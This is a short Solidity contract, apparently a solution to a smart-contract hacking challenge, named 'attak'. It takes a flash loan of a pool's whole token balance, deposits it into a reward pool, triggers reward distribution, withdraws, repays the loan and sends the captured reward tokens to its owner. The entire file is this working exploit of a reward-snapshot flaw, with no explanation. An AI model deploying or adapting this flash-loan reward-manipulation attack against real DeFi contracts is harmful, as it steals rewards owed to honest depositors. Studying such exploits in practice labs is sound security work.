// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract attak {
    loan pool;
    address owner;
    address liqTok;
    rePol rewardPool;
    address rewtk;

    constructor(address payable _pool, address lt, address rewPol) {
        pool = loan(_pool);
        owner = msg.sender;
        liqTok = lt;
        rewardPool = rePol(rewPol);
        rewtk = rewardPool.rewardToken();
    }

    function receiveFlashLoan(uint256) external {
        uint256 balthis = IERC20(liqTok).balanceOf(address(this));
        IERC20(liqTok).approve(address(rewardPool), balthis);
        rewardPool.deposit(balthis);
        rewardPool.distributeRewards();
        rewardPool.withdraw(balthis);
        IERC20(liqTok).transfer(address(pool), balthis);
        IERC20(rewtk).transfer(owner, IERC20(rewtk).balanceOf(address(this)));
    }

    function doFl() external {
        pool.flashLoan(IERC20(liqTok).balanceOf(address(pool)));
    }
}

interface loan {
    function flashLoan(uint256 amount) external;
}

interface rePol {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function accToken() external returns (address);
    function distributeRewards() external returns (uint256);

    function rewardToken() external returns (address);
}
